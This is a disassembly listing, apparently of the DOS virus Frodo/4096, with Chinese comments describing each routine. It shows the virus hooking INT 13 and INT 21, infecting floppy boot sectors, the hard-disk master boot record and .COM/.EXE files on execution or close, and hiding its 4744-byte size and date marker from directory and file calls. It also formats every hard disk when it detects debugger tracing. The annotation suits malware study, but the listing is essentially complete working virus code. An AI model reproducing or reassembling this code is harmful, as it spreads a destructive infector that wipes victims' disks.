+9E80:03B5 2EA4           MOVSB	CS: 
+9E80:03B7 B8FA03         MOV	AX,03FA 	;转高端 03FA 继续执行
+9E80:03BA 06             PUSH	ES 
+9E80:03BB 50             PUSH	AX 
+9E80:03BC CB             RETF	 
+;=========================================================================
+9E80:03BD 0E             PUSH	CS 		;执行原程序
+9E80:03BE 1F             POP	DS 
+9E80:03BF 07             POP	ES 
+9E80:03C0 8DB47012       LEA	SI,[SI+1270] 	;原文件头位置
+9E80:03C4 8B04           MOV	AX,[SI] 
+9E80:03C6 3D4D5A         CMP	AX,5A4D 	;.EXE 文件转 03DF
+9E80:03C9 7414           JZ	03DF 
+9E80:03CB 3D5A4D         CMP	AX,4D5A 
+9E80:03CE 740F           JZ	03DF 
+9E80:03D0 B90C00         MOV	CX,000C 	;.COM 文件恢复原文件头 000C字
+9E80:03D3 BF0001         MOV	DI,0100 	;原文件头 ==> CS:0100
+9E80:03D6 06             PUSH	ES 
+9E80:03D7 57             PUSH	DI 
+9E80:03D8 FC             CLD	 
+9E80:03D9 F3             REPZ	
+9E80:03DA A5             MOVSW	 
+9E80:03DB 06             PUSH	ES 
+9E80:03DC 1F             POP	DS 
+9E80:03DD 91             XCHG	AX,CX 		;执行原 .COM 文件
+9E80:03DE CB             RETF	 
+9E80:03DF 8CC0           MOV	AX,ES 		;.EXE 文件重定位
+9E80:03E1 051000         ADD	AX,0010 
+9E80:03E4 014416         ADD	[SI+16],AX 
+9E80:03E7 03440E         ADD	AX,[SI+0E] 
+9E80:03EA 06             PUSH	ES 
+9E80:03EB 1F             POP	DS 
+9E80:03EC FA             CLI	 
+9E80:03ED 8ED0           MOV	SS,AX 
+9E80:03EF 2E8B6410       MOV	SP,CS:[SI+10] 
+9E80:03F3 33C0           XOR	AX,AX 
+9E80:03F5 FB             STI	 
+9E80:03F6 2EFF6C14       JMP	FAR CS:[SI+14] 	;执行原 .EXE 文件
+;=========================================================================
+;文件初始化时由低段跳转过来
+9E80:03FA 0E             PUSH	CS 
+9E80:03FB 1F             POP	DS 		;DI = 13DA
+9E80:03FC C6453801       MOV	Byte Ptr [DI+38],01 	;DS:[1412]
+9E80:0400 B80200         MOV	AX,0002 
+9E80:0403 E8600D         CALL	1166 		;产生随机数
+9E80:0406 A23D0A         MOV	[0A3D],AL 
+9E80:0409 C60673042E     MOV	Byte Ptr [0473],2E 
+9E80:040E B0EA           MOV	AL,EA 
+9E80:0410 AA             STOSB	 
+9E80:0411 884504         MOV	[DI+04],AL 	;新 INT 13 中断前 5 字节
+9E80:0414 B87204         MOV	AX,0472 	;JMP CS:0472
+9E80:0417 AB             STOSW	 
+9E80:0418 C745037305     MOV	Word Ptr [DI+03],0573 
+9E80:041D 8C0D           MOV	[DI],CS 	;新 INT 21 中断前 5 字节
+9E80:041F 8C4D05         MOV	[DI+05],CS 	;JMP CS:0573
+9E80:0422 57             PUSH	DI 
+9E80:0423 E8EEFD         CALL	0214		;取 INT 13/15/21/40 地址 
+9E80:0426 5F             POP	DI 
+9E80:0427 0E             PUSH	CS 
+9E80:0428 1F             POP	DS 
+9E80:0429 A1AD02         MOV	AX,[02AD] 
+9E80:042C 394515         CMP	[DI+15],AX 	;[13EF]
+9E80:042F 770B           JA	043C 
+9E80:0431 394521         CMP	[DI+21],AX 	;[13FB]
+9E80:0434 7706           JA	043C 		;未找到 MSDOS INT 21 入口不截取
+9E80:0436 E8ABFD         CALL	01E4 		;截取 INT 13
+9E80:0439 E8B4FD         CALL	01F0 		;截取 INT 21
+9E80:043C E8D4FC         CALL	0113 		;传染硬盘主引导区
+9E80:043F 0BED           OR	BP,BP 
+9E80:0441 8BF5           MOV	SI,BP 
+9E80:0443 7503           JNZ	0448 		;有跟踪转 0448
+9E80:0445 E975FF         JMP	03BD 		;无跟踪转 03BD 执行原程序
+9E80:0448 33DB           XOR	BX,BX 
+9E80:044A 8EC3           MOV	ES,BX 
+9E80:044C B280           MOV	DL,80 
+9E80:044E 32F6           XOR	DH,DH 
+9E80:0450 33C9           XOR	CX,CX 		;如果有跟踪
+9E80:0452 B80105         MOV	AX,0501 	;格式化硬盘
+9E80:0455 E85E06         CALL	0AB6 
+9E80:0458 80E1C0         AND	CL,C0 
+9E80:045B FEC5           INC	CH 
+9E80:045D 75F3           JNZ	0452 
+9E80:045F 80C140         ADD	CL,40
+9E80:0462 75EE           JNZ	0452 
+9E80:0464 32E4           XOR	AH,AH 		;磁盘复位
+9E80:0466 CD13           INT	13 
+9E80:0468 FEC6           INC	DH 
+9E80:046A 80FE10         CMP	DH,10 
+9E80:046D 72E1           JB	0450 
+9E80:046F 42             INC	DX 		;转格式化第二个硬盘
+9E80:0470 EBDC           JMP	044E 
+;=========================================================================
+;	病毒新 INT 13H 中断服务程序
+;=========================================================================
+9E80:0472 EB2E           JMP	04A2   ====>	;本句指令引导区引入时为 NOP
+9E80:0474 E875FC         CALL	00EC 		;本段程序为在引导区启动
+9E80:0477 B021           MOV	AL,21		;时截取 INT 21
+9E80:0479 E847FC         CALL	00C3 		;取 INT 21 中断向量于 ES:BX
+9E80:047C 8CC0           MOV	AX,ES 
+9E80:047E 0E             PUSH	CS 
+
+9E80:047F 0E             PUSH	CS 
+9E80:0480 1F             POP	DS 
+9E80:0481 07             POP	ES 
+9E80:0482 3D0008         CMP	AX,0800 	;INT 21 段地址 > 0800
+9E80:0485 7718           JA	049F 		;表示尚未设置
+9E80:0487 BFFD13         MOV	DI,13FD 
+9E80:048A FD             STD	 
+9E80:048B 8705           XCHG	AX,[DI] 
+9E80:048D AF             SCASW	 
+9E80:048E 740F           JZ	049F 		;等于启动初始值退出
+9E80:0490 891D           MOV	[DI],BX 	;保存新地址
+9E80:0492 B021           MOV	AL,21
+9E80:0494 BA7305         MOV	DX,0573 	;设置新 INT 21 到 CS:0573
+9E80:0497 E83AFC         CALL	00D4 
+9E80:049A C60673042E     MOV	Byte Ptr [0473],2E;将 0472 处改为 JMP 04A2
+9E80:049F E860FC         CALL	0102 		;POPA
+9E80:04A2 80FC02         CMP	AH,02 
+9E80:04A5 7509           JNZ	04B0 
+9E80:04A7 83F901         CMP	CX,+01 
+9E80:04AA 7504           JNZ	04B0 
+9E80:04AC 0AF6           OR	DH,DH 		;读引导区转 04B6
+9E80:04AE 7406           JZ	04B6 
+9E80:04B0 E8F605         CALL	0AA9 		;执行原 INT 13H
+9E80:04B3 CA0200         RETF	0002 
+;===========================================================================
+;读引导区时返回原引导记录及传染程序
+9E80:04B6 E8F005         CALL	0AA9 		;执行原 INT 13H
+9E80:04B9 E830FC         CALL	00EC 		;PUSHA
+9E80:04BC 723D           JB	04FB 
+9E80:04BE 06             PUSH	ES 
+9E80:04BF 0E             PUSH	CS 
+9E80:04C0 07             POP	ES 
+9E80:04C1 1F             POP	DS 
+9E80:04C2 B90001         MOV	CX,0100 
+9E80:04C5 8BF3           MOV	SI,BX 
+9E80:04C7 BF1314         MOV	DI,1413 
+9E80:04CA 8BDF           MOV	BX,DI 
+9E80:04CC FC             CLD	 
+9E80:04CD F3             REPZ			;移动读出的引导记录
+9E80:04CE A5             MOVSW	 		;到 CS:1413
+9E80:04CF 0E             PUSH	CS 
+9E80:04D0 1F             POP	DS 
+9E80:04D1 E8B8FC         CALL	018C 		;判断是否已传染
+9E80:04D4 752B           JNZ	0501 
+9E80:04D6 B80102         MOV	AX,0201 	;已传染读出原引导记录
+9E80:04D9 8B4C1B         MOV	CX,[SI+1B] 
+9E80:04DC 8A741F         MOV	DH,[SI+1F] 
+9E80:04DF E8D405         CALL	0AB6 
+9E80:04E2 7217           JB	04FB 
+9E80:04E4 A10000         MOV	AX,[0000] 
+9E80:04E7 3907           CMP	[BX],AX 
+9E80:04E9 7510           JNZ	04FB 		;无病毒转 04FB
+9E80:04EB 8B7E0E         MOV	DI,[BP+0E] 
+9E80:04EE 8E4600         MOV	ES,[BP+00] 
+9E80:04F1 2BF3           SUB	SI,BX 
+9E80:04F3 03FE           ADD	DI,SI 
+9E80:04F5 8D7747         LEA	SI,[BX+47] 	;解密恢复原引导记录
+9E80:04F8 E83BFB         CALL	0036 
+9E80:04FB E804FC         CALL	0102 		;POPA
+9E80:04FE CA0200         RETF	0002 
+;==========================================================================
+;传染引导记录程序
+9E80:0501 80FA80         CMP	DL,80		;是硬盘不传染 
+9E80:0504 73F5           JNB	04FB 
+9E80:0506 B80103         MOV	AX,0301
+9E80:0509 B90100         MOV	CX,0001 
+9E80:050C E8A705         CALL	0AB6 
+9E80:050F 72EA           JB	04FB 
+9E80:0511 8BF2           MOV	SI,DX 
+9E80:0513 8BFB           MOV	DI,BX 
+9E80:0515 8B4513         MOV	AX,[DI+13] 
+9E80:0518 8B4D18         MOV	CX,[DI+18] 
+9E80:051B 294D13         SUB	[DI+13],CX 
+9E80:051E 890E6F05       MOV	[056F],CX 
+9E80:0522 33D2           XOR	DX,DX 
+9E80:0524 0BC0           OR	AX,AX 
+9E80:0526 74D3           JZ	04FB 
+9E80:0528 E3D1           JCXZ	04FB 
+9E80:052A F7F1           DIV	CX 
+9E80:052C 0BD2           OR	DX,DX 
+9E80:052E 75CB           JNZ	04FB 
+9E80:0530 8B5D1A         MOV	BX,[DI+1A] 
+9E80:0533 0BDB           OR	BX,BX 
+9E80:0535 74C4           JZ	04FB 
+9E80:0537 F7F3           DIV	BX 
+9E80:0539 0BD2           OR	DX,DX 
+9E80:053B 75BE           JNZ	04FB 
+9E80:053D 48             DEC	AX 
+9E80:053E 8AE8           MOV	CH,AL 
+9E80:0540 B101           MOV	CL,01 
+9E80:0542 4B             DEC	BX 
+9E80:0543 8BD6           MOV	DX,SI 
+9E80:0545 8AF3           MOV	DH,BL 
+9E80:0547 8BDF           MOV	BX,DI 
+9E80:0549 E80DFC         CALL	0159 
+9E80:054C 72AD           JB	04FB 
+9E80:054E B80903         MOV	AX,0309 
+9E80:0551 33DB           XOR	BX,BX 
+9E80:0553 E86005         CALL	0AB6 
+9E80:0556 72A3           JB	04FB 
+9E80:0558 B80103         MOV	AX,0301 
+9E80:055B BB1314         MOV	BX,1413 
+9E80:055E B90100         MOV	CX,0001 
+9E80:0561 32F6           XOR	DH,DH 
+9E80:0563 E85005         CALL	0AB6 
+9E80:0566 8B5E0E         MOV	BX,[BP+0E] 
+9E80:0569 8E5E00         MOV	DS,[BP+00] 
+9E80:056C 816F130F00     SUB	Word Ptr [BX+13],000F 
+9E80:0571 EB88           JMP	04FB 
+;=======================================================================
+;	新 INT 21 代码部分
+;=======================================================================
+9E80:0573 FA             CLI	 
+9E80:0574 2E8C16D512     MOV	CS:[12D5],SS 	;保存堆栈地址
+9E80:0579 2E8926D712     MOV	CS:[12D7],SP 
+9E80:057E 0E             PUSH	CS 
+9E80:057F 17             POP	SS 
+9E80:0580 BCD913         MOV	SP,13D9 	;切换到内部堆栈
+9E80:0583 FB             STI	 
+9E80:0584 E865FB         CALL	00EC 		;PUSHA
+9E80:0587 E421           IN	AL,21
+9E80:0589 0C02           OR	AL,02 
+9E80:058B E621           OUT	21,AL		;屏蔽键盘
+9E80:058D 0E             PUSH	CS 
+9E80:058E 1F             POP	DS 
+9E80:058F BFFF13         MOV	DI,13FF 
+9E80:0592 899DC4F6       MOV	[DI+F6C4],BX 	;MOV [0AC3],BX
+9E80:0596 B024           MOV	AL,24
+9E80:0598 E828FB         CALL	00C3 		;取中断向量 INT 24
+9E80:059B 895DE8         MOV	[DI-18],BX 	;保存于 13E7
+9E80:059E 8C45EA         MOV	[DI-16],ES 
+9E80:05A1 C705B003       MOV	Word Ptr [DI],03B0 	;MOV AL,3
+9E80:05A5 C64502CF       MOV	Byte Ptr [DI+02],CF 	;IRET
+9E80:05A9 8BD7           MOV	DX,DI		;设置新 INT 24 中断向量 
+9E80:05AB E826FB         CALL	00D4 
+9E80:05AE E851FB         CALL	0102 		;POPA
+9E80:05B1 E83CFC         CALL	01F0 		;恢复原 INT 21 中断 5 字节
+9E80:05B4 E835FB         CALL	00EC 		;以便调用
+;==========================================================================
+9E80:05B7 80FC30         CMP	AH,30
+9E80:05BA 750E           JNZ	05CA 
+9E80:05BC 81C36606       ADD	BX,0666 	;病毒驻留检测, DOS 30H 功能
+9E80:05C0 7508           JNZ	05CA 		;以 BX = F99A 调用
+9E80:05C2 895E10         MOV	[BP+10],BX 	;返回 AX = 0000
+9E80:05C5 895E0E         MOV	[BP+0E],BX 
+9E80:05C8 EB5C           JMP	0626 		;INT 21 返回
+;==========================================================================
+9E80:05CA 80FC11         CMP	AH,11 
+9E80:05CD 726F           JB	063E 
+9E80:05CF 80FC12         CMP	AH,12 		;DOS 11,12 功能 (DIR)
+9E80:05D2 776A           JA	063E 
+9E80:05D4 E8EE04         CALL	0AC5 		;先调用原 INT 21
+9E80:05D7 0AC0           OR	AL,AL		;未找到目录项返回 
+9E80:05D9 7403           JZ	05DE 
+9E80:05DB E9A502         JMP	0883 
+9E80:05DE E84E04         CALL	0A2F 		;设置 INT 21 返回值(堆栈中)
+9E80:05E1 E8AC04         CALL	0A90 		;取当前执行文件名
+9E80:05E4 B84348         MOV	AX,4843 	;于 ES:DI (从 MCB 中)
+9E80:05E7 AF             SCASW	 		; "HC"
+9E80:05E8 750C           JNZ	05F6 
+9E80:05EA B84B44         MOV	AX,444B 	; "DK"
+9E80:05ED AF             SCASW	 
+9E80:05EE 7506           JNZ	05F6 
+9E80:05F0 B8534B         MOV	AX,4B53 	; "KS" 即 CHKDSK
+9E80:05F3 AF             SCASW	 		;如果执行文件是 CHKDSK
+9E80:05F4 7430           JZ	0626 		;则文件长度不减
+9E80:05F6 E8A804         CALL	0AA1 		;取 DTA => ES:BX
+9E80:05F9 33FF           XOR	DI,DI 
+9E80:05FB 803FFF         CMP	Byte Ptr [BX],FF 
+9E80:05FE 7503           JNZ	0603 
+9E80:0600 BF0700         MOV	DI,0007 	;扩展 FCB
+9E80:0603 8D711A         LEA	SI,[BX+DI+1A] 	;
+9E80:0606 E82E04         CALL	0A37 		;如果是 ARJ,LHA,PK系列
+9E80:0609 741B           JZ	0626 		;BACKUP,MODEM等文件执行中
+9E80:060B 803CC8         CMP	Byte Ptr [SI],C8 ;则不改动 (以下同)
+9E80:060E 7216           JB	0626 		;未传染返回
+9E80:0610 802CC8         SUB	Byte Ptr [SI],C8 	;已传染,年号-100
+9E80:0613 C4411D         LES	AX,[BX+DI+1D] 
+9E80:0616 8CC1           MOV	CX,ES 
+9E80:0618 2D8812         SUB	AX,1288 	;文件长 - 4744 字节
+9E80:061B 83D900         SBB	CX,+00 
+9E80:061E 7206           JB	0626 
+9E80:0620 89411D         MOV	[BX+DI+1D],AX 
+9E80:0623 89491F         MOV	[BX+DI+1F],CX 
+9E80:0626 E8F503         CALL	0A1E 		;恢复 INT 24,开键盘
+9E80:0629 E8D6FA         CALL	0102 		;POPA
+9E80:062C E8C1FB         CALL	01F0 		;修改 INT 21 头 5 字节
+9E80:062F FA             CLI	 
+9E80:0630 2E8E16D512     MOV	SS,CS:[12D5] 	;恢复原堆栈
+9E80:0635 2E8B26D712     MOV	SP,CS:[12D7] 
+9E80:063A FB             STI	 
+9E80:063B CA0200         RETF	0002 
+;========================================================================
+9E80:063E 80FC4E         CMP	AH,4E		;INT 21 之寻找文件功能
+9E80:0641 721B           JB	065E 
+9E80:0643 80FC4F         CMP	AH,4F
+9E80:0646 7716           JA	065E 
+9E80:0648 E87A04         CALL	0AC5 		;先调用原 INT 21
+9E80:064B 7303           JNB	0650 
+9E80:064D E93302         JMP	0883 
+9E80:0650 E8DC03         CALL	0A2F 		;保存返回 AX
+9E80:0653 E84B04         CALL	0AA1 		;取 DTA 于 ES:BX
+9E80:0656 BFFDFF         MOV	DI,FFFD 
+9E80:0659 8D7719         LEA	SI,[BX+19] 	;更改文件长及时间
+9E80:065C EBA8           JMP	0606 
+;=======================================================================
+9E80:065E 3D0242         CMP	AX,4202 	;INT 21 之测试文件长功能
+9E80:0661 7524           JNZ	0687 
+9E80:0663 E85C04         CALL	0AC2 		;调用原 INT 21
+9E80:0666 72E5           JB	064D 
+9E80:0668 E84003         CALL	09AB 		;取系统文件表项于 ES:DI
+9E80:066B 7611           JBE	067E 
+9E80:066D E8C703         CALL	0A37 		;
+9E80:0670 740C           JZ	067E 
+9E80:0672 2D8812         SUB	AX,1288 	;如果传染
+9E80:0675 83DA00         SBB	DX,+00 		;文件长 - 4744
+9E80:0678 894515         MOV	[DI+15],AX 
+9E80:067B 895517         MOV	[DI+17],DX 
+9E80:067E F8             CLC	 
+9E80:067F E8AD03         CALL	0A2F 		;设置 INT 21 返回值
+9E80:0682 89560A         MOV	[BP+0A],DX 	;设置返回 DX
+9E80:0685 EB9F           JMP	0626 
+;========================================================================
+9E80:0687 3D0057         CMP	AX,5700 	;INT 21 之文件时间功能
+9E80:068A 7412           JZ	069E 
+9E80:068C 3D0157         CMP	AX,5701 
+9E80:068F 752F           JNZ	06C0 
+9E80:0691 E81703         CALL	09AB 		;设置文件时间
+9E80:0694 7612           JBE	06A8 		;如果传染
+9E80:0696 80FEC8         CMP	DH,C8 		;未加 100 年则加 100 年
+9E80:0699 730D           JNB	06A8 
+9E80:069B 80C6C8         ADD	DH,C8 
+9E80:069E E89603         CALL	0A37 
+9E80:06A1 7405           JZ	06A8 
+9E80:06A3 E81C04         CALL	0AC2 
+9E80:06A6 7303           JNB	06AB 
+9E80:06A8 E9D801         JMP	0883 
+9E80:06AB 80FEC8         CMP	DH,C8 		;取文件时间
+9E80:06AE 7203           JB	06B3 		;如果传染,则减 100 年
+9E80:06B0 80EEC8         SUB	DH,C8 
+9E80:06B3 F8             CLC	 
+9E80:06B4 E87803         CALL	0A2F 		;设置 INT 21 返回值
+9E80:06B7 894E0C         MOV	[BP+0C],CX 	;设置返回 CX,DX 值
+9E80:06BA 89560A         MOV	[BP+0A],DX 
+9E80:06BD E966FF         JMP	0626 
+;==========================================================================
+9E80:06C0 80FC3F         CMP	AH,3F		;INT 21 之读文件功能
+9E80:06C3 7403           JZ	06C8 
+9E80:06C5 E9BD00         JMP	0785 
+9E80:06C8 E8E002         CALL	09AB 		;取系统文件表项地址
+9E80:06CB 76F8           JBE	06C5 
+9E80:06CD E86703         CALL	0A37 		;压缩程序内退出
+9E80:06D0 74F3           JZ	06C5 
+9E80:06D2 C44511         LES	AX,[DI+11] 	;文件大小 => BX:AX
+9E80:06D5 8CC3           MOV	BX,ES 
+9E80:06D7 C45515         LES	DX,[DI+15] 	;当前指针 => SI:DX
+9E80:06DA 8CC6           MOV	SI,ES 
+9E80:06DC 2E83267C0700   AND	Word Ptr CS:[077C],+00 ;读出长度清零
+9E80:06E2 0BF6           OR	SI,SI 
+9E80:06E4 754D           JNZ	0733 
+9E80:06E6 83FA18         CMP	DX,+18 
+9E80:06E9 7348           JNB	0733 
+9E80:06EB 51             PUSH	CX 		;当前指针 < 0000:0018
+9E80:06EC 03CA           ADD	CX,DX 
+9E80:06EE F5             CMC	 
+9E80:06EF 7303           JNB	06F4 		;> 64K 转 06F7
+9E80:06F1 83F918         CMP	CX,+18 
+9E80:06F4 59             POP	CX 		;读文件头 18 字节内
+9E80:06F5 7205           JB	06FC 		;转 06FC
+9E80:06F7 B91800         MOV	CX,0018 	;一半在文件头 18 字节内
+9E80:06FA 2BCA           SUB	CX,DX 		;CX=在文件头18字节内的字节数
+9E80:06FC 50             PUSH	AX 
+9E80:06FD 53             PUSH	BX 
+9E80:06FE 52             PUSH	DX 
+9E80:06FF 83EA18         SUB	DX,+18 		;BX:AX = 文件长
+9E80:0702 03C2           ADD	AX,DX 		;
+9E80:0704 F5             CMC	 
+9E80:0705 1BDE           SBB	BX,SI 
+9E80:0707 874515         XCHG	AX,[DI+15] 	;文件指针指向文件尾
+9E80:070A 875D17         XCHG	BX,[DI+17] 	
+9E80:070D 50             PUSH	AX 
+9E80:070E 53             PUSH	BX 
+9E80:070F 1E             PUSH	DS 
+9E80:0710 B43F           MOV	AH,3F		;读出原文件头
+9E80:0712 8B560A         MOV	DX,[BP+0A] 
+9E80:0715 8E5E02         MOV	DS,[BP+02] 
+9E80:0718 E8A703         CALL	0AC2 
+9E80:071B 1F             POP	DS 
+9E80:071C 8F4517         POP	[DI+17] 	;恢复原文件指针
+9E80:071F 8F4515         POP	[DI+15] 
+9E80:0722 5A             POP	DX 
+9E80:0723 9C             PUSHF	 		;由于分两部分读出
+9E80:0724 03D0           ADD	DX,AX 		;所以保留第一次读出数
+9E80:0726 2E01067C07     ADD	CS:[077C],AX 	;返回时加上第二次读出数
+9E80:072B 9D             POPF	 
+9E80:072C 5B             POP	BX 		;BX:AX = 文件长
+9E80:072D 58             POP	AX 
+9E80:072E 7303           JNB	0733 
+9E80:0730 E95001         JMP	0883 
+9E80:0733 895515         MOV	[DI+15],DX 	;读出第一部分后的
+9E80:0736 897517         MOV	[DI+17],SI 	;文件指针
+9E80:0739 8B4E0C         MOV	CX,[BP+0C] 	;原读出字节数
+9E80:073C 2E2B0E7C07     SUB	CX,CS:[077C] 	;减去已读出字节数
+9E80:0741 2D8812         SUB	AX,1288 	;BX:AX = 文件长
+9E80:0744 83DB00         SBB	BX,+00 
+9E80:0747 50             PUSH	AX 
+9E80:0748 53             PUSH	BX 		;BX:AX = 减去病毒后文件长
+9E80:0749 2BC2           SUB	AX,DX 		;
+9E80:074B 1BDE           SBB	BX,SI 
+9E80:074D 5B             POP	BX 
+9E80:074E 58             POP	AX 
+9E80:074F 7304           JNB	0755 		;当前指针不在病毒内转 0755
+9E80:0751 33C9           XOR	CX,CX 		;当前指针在病毒内
+9E80:0753 EB14           JMP	0769 		;则读出 0 字节
+9E80:0755 03D1           ADD	DX,CX 
+9E80:0757 83D600         ADC	SI,+00 		;SI:DX = 读出后
+9E80:075A 3BDE           CMP	BX,SI 		;指针将要在的位置
+9E80:075C 770B           JA	0769 
+9E80:075E 7204           JB	0764 
+9E80:0760 3BC2           CMP	AX,DX 
+9E80:0762 7305           JNB	0769 		;未到病毒内转 0769
+9E80:0764 2BD1           SUB	DX,CX 		;
+9E80:0766 91             XCHG	AX,CX 
+9E80:0767 2BCA           SUB	CX,DX 		;CX = 到原文件尾长度
+9E80:0769 B43F           MOV	AH,3F
+9E80:076B 8B560A         MOV	DX,[BP+0A] 
+9E80:076E 2E03167C07     ADD	DX,CS:[077C] 
+9E80:0773 8E5E02         MOV	DS,[BP+02] 
+9E80:0776 E84903         CALL	0AC2 		;读出文件
+9E80:0779 7204           JB	077F 
+9E80:077B 051800         ADD	AX,0018   ===>	;本字节在第一次读出时保存
+9E80:077E F8             CLC	 
+9E80:077F E8AD02         CALL	0A2F 		;保存返回 AX
+9E80:0782 E9A1FE         JMP	0626 
+;==========================================================================
+9E80:0785 80FC40         CMP	AH,40		;INT 21 之写文件功能
+9E80:0788 7402           JZ	078C 
+9E80:078A EB52           JMP	07DE 
+9E80:078C E81C02         CALL	09AB 		;取系统文件表项地址
+9E80:078F 76F9           JBE	078A 
+9E80:0791 C44511         LES	AX,[DI+11] 
+9E80:0794 8CC3           MOV	BX,ES 		;BX:AX = 文件长
+9E80:0796 2D1800         SUB	AX,0018 
+9E80:0799 83DB00         SBB	BX,+00 
+9E80:079C 874515         XCHG	AX,[DI+15] 	;当前指针 => 文件尾-0018
+9E80:079F 875D17         XCHG	BX,[DI+17] 	;BX:AX = 当前指针
+9E80:07A2 50             PUSH	AX 
+9E80:07A3 53             PUSH	BX 
+9E80:07A4 B80200         MOV	AX,0002 
+9E80:07A7 874502         XCHG	AX,[DI+02] 	;设置为写打开
+9E80:07AA 50             PUSH	AX 
+9E80:07AB 1E             PUSH	DS 
+9E80:07AC 0E             PUSH	CS 
+9E80:07AD 1F             POP	DS 
+9E80:07AE 07             POP	ES 
+9E80:07AF E85902         CALL	0A0B 		;读出原文件头 => CS:1270
+9E80:07B2 268F4502       POP	ES:[DI+02] 	;恢复打开方式
+9E80:07B6 721B           JB	07D3 
+9E80:07B8 26894515       MOV	ES:[DI+15],AX 	;当前指针 => 文件开始
+9E80:07BC 26894517       MOV	ES:[DI+17],AX 
+9E80:07C0 E84B02         CALL	0A0E 		;写文件头(恢复)
+9E80:07C3 720E           JB	07D3 
+9E80:07C5 06             PUSH	ES 
+9E80:07C6 1F             POP	DS 
+9E80:07C7 816D118812     SUB	Word Ptr [DI+11],1288 
+9E80:07CC 194513         SBB	[DI+13],AX 	;文件长 - 4744
+9E80:07CF 806D10C8       SUB	Byte Ptr [DI+10],C8 	;恢复日期
+9E80:07D3 268F4517       POP	ES:[DI+17] 	;恢复文件指针
+9E80:07D7 268F4515       POP	ES:[DI+15] 
+9E80:07DB E9A500         JMP	0883 		;转原 INT 21
+;=========================================================================
+9E80:07DE 80FC3E         CMP	AH,3E		;关闭文件
+9E80:07E1 740C           JZ	07EF 		;先复制文件句柄再传染
+9E80:07E3 3D004B         CMP	AX,4B00 	;执行文件
+9E80:07E6 7403           JZ	07EB 		;先打开文件再传染
+9E80:07E8 E99800         JMP	0883 
+9E80:07EB B8003D         MOV	AX,3D00 
+9E80:07EE 3DB445         CMP	AX,45B4 
+9E80:07F1 E8E501         CALL	09D9 		;将 INT 13 切换到 BIOS
+9E80:07F4 E8CB02         CALL	0AC2 		;打开/复制文件
+9E80:07F7 2EA3C30A       MOV	CS:[0AC3],AX 
+9E80:07FB B80844         MOV	AX,4408 
+9E80:07FE 99             CWD	 
+9E80:07FF 727F           JB	0880
+9E80:0801 E8A701         CALL	09AB		;取系统文件表项 
+9E80:0804 7275           JB	087B 		;出错退出
+9E80:0806 7573           JNZ	087B 		;已传染退出
+9E80:0808 B33F           MOV	BL,3F
+9E80:080A 225D05         AND	BL,[DI+05] 	;设备信息字
+9E80:080D 8AD3           MOV	DL,BL 		;DL = 驱动器号 (A=0,B=1...)
+9E80:080F 43             INC	BX 		;BX = 驱动器号 (A=1,B=2...)
+9E80:0810 E8B202         CALL	0AC5 		;DOS 4408 功能
+9E80:0813 B90100         MOV	CX,0001 	;检测块设备是否可移动
+9E80:0816 0E             PUSH	CS 
+9E80:0817 07             POP	ES 
+9E80:0818 7205           JB	081F 
+9E80:081A 48             DEC	AX 
+9E80:081B 7418           JZ	0835 		;固定设备转 0835
+9E80:081D EB05           JMP	0824 		;非可移动设备退出
+9E80:081F 80FA01         CMP	DL,01 
+9E80:0822 7711           JA	0835 		;C 盘以上不用检测
+9E80:0824 B80102         MOV	AX,0201 	;如果是软盘,检测写保护
+9E80:0827 BB1314         MOV	BX,1413 	;先读出
+9E80:082A CD13           INT	13 
+9E80:082C 724D           JB	087B 
+9E80:082E B80103         MOV	AX,0301 	;再写入
+9E80:0831 CD13           INT	13 
+9E80:0833 7246           JB	087B 		;无法写入退出(写保护)
+9E80:0835 41             INC	CX 
+9E80:0836 874D02         XCHG	CX,[DI+02] 	;设置文件打开方式为写打开
+9E80:0839 51             PUSH	CX 		;保存原打开方式
+9E80:083A 33C0           XOR	AX,AX 
+9E80:083C 866504         XCHG	AH,[DI+04] 	;文件属性
+9E80:083F F6C404         TEST	AH,04 		;系统属性退出
+9E80:0842 50             PUSH	AX 		;保存文件属性
+9E80:0843 7530           JNZ	0875 
+9E80:0845 98             CBW	 
+9E80:0846 99             CWD	 		;AX 清零
+9E80:0847 874515         XCHG	AX,[DI+15] 	;移动文件指针到文件头
+9E80:084A 875517         XCHG	DX,[DI+17] 
+9E80:084D 50             PUSH	AX 		;保存原文件指针
+9E80:084E 52             PUSH	DX 
+9E80:084F BDBDB0         MOV	BP,B0BD 	;扩展名不为 "COM"
+9E80:0852 036D28         ADD	BP,[DI+28] 	;转 085D
+9E80:0855 7506           JNZ	085D 
+9E80:0857 BDB1B2         MOV	BP,B2B1 
+9E80:085A 036D29         ADD	BP,[DI+29] 
+9E80:085D E86900         CALL	08C9            ;执行传染子程序
+9E80:0860 9C             PUSHF	 
+9E80:0861 E84701         CALL	09AB 		;取系统文件表项
+9E80:0864 9D             POPF	 
+9E80:0865 7204           JB	086B 
+9E80:0867 804510C8       ADD	Byte Ptr [DI+10],C8 	;文件年份+100
+9E80:086B 804D0640       OR	Byte Ptr [DI+06],40	;关闭时不设置时间
+9E80:086F 8F4517         POP	[DI+17] 	;恢复系统文件表项
+9E80:0872 8F4515         POP	[DI+15] 	;中相应内容
+9E80:0875 8F4503         POP	[DI+03] 
+9E80:0878 8F4502         POP	[DI+02] 
+9E80:087B B43E           MOV	AH,3E		;关闭文件
+9E80:087D E84202         CALL	0AC2 
+9E80:0880 E85601         CALL	09D9 		;将 INT 13 恢复到 DOS
+9E80:0883 E89801         CALL	0A1E 		;恢复 INT 24 及键盘状态
+9E80:0886 0E             PUSH	CS 
+9E80:0887 1F             POP	DS 
+9E80:0888 B001           MOV	AL,01 
+9E80:088A BFE313         MOV	DI,13E3 
+9E80:088D 38452E         CMP	[DI+2E],AL	;??????
+9E80:0890 7532           JNZ	08C4 		;放弃重新截取 INT 21 ????
+9E80:0892 E82EF8         CALL	00C3		;取中断向量 01 
+9E80:0895 891D           MOV	[DI],BX 
+9E80:0897 8C4502         MOV	[DI+02],ES 	;保存于 13E3
+9E80:089A C6452F05       MOV	Byte Ptr [DI+2F],05 
+9E80:089E C60697023F     MOV	Byte Ptr [0297],3F
+9E80:08A3 BA7702         MOV	DX,0277 	;设置中断向量 01
+9E80:08A6 E82BF8         CALL	00D4 		;到 CS:0277
+9E80:08A9 E856F8         CALL	0102 		;POPA
+9E80:08AC 56             PUSH	SI 
+9E80:08AD 9C             PUSHF	 
+9E80:08AE 5E             POP	SI 		;标志 FLAG => SI
+9E80:08AF E8BEF9         CALL	0270 		;启动 INT 01 (重新截取INT 21用)
+9E80:08B2 5E             POP	SI 		;本句转 INT 01 (0277) 执行
+9E80:08B3 FA             CLI	 
